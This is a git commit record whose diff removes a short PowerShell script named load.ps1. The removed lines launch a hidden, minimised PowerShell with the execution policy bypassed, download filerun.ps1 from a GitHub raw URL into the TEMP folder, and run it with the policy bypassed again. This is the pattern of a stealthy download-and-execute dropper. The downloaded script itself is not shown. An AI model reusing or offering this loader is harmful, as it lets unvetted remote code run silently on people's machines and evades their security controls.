73ba0a27c944fb71036494a3c44fb748180de95f
KevinDark5 <jotpaz@imail.edu.vn>
2025-01-20 18:02:04 +0700

    Update load.ps1

--- load.ps1
+++ load.ps1
@@ -1,6 +1,1 @@
-cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
-$scriptUrl = "https://github.com/KevinDark5/data/raw/refs/heads/main/filerun.ps1"
-$tempFile = "$env:TEMP\filerun.ps1"
 
-Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile
-PowerShell -ExecutionPolicy Bypass -File $tempFile
